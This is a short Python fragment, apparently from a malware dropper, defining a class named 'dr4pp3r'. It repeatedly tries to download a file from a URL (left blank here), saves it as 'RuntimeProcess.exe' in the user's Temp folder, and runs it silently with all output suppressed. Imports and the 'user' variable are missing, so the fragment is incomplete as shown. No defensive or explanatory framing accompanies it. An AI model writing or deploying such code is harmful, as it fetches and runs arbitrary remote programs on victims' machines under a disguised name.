class dr4pp3r:
    def __init__(self):
        self.path = f"C:\\Users\\{user}\\AppData\\Local\\Temp"
        self.__drop__()
    def __drop__(self):
        while True:
            try:
                DRAPPER=requests.get("").content
                open(self.path+"\\RuntimeProcess.exe","wb").write(DRAPPER)
                break
            except:
                sleep(5)
        subprocess.run([self.path+"\\RuntimeProcess.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)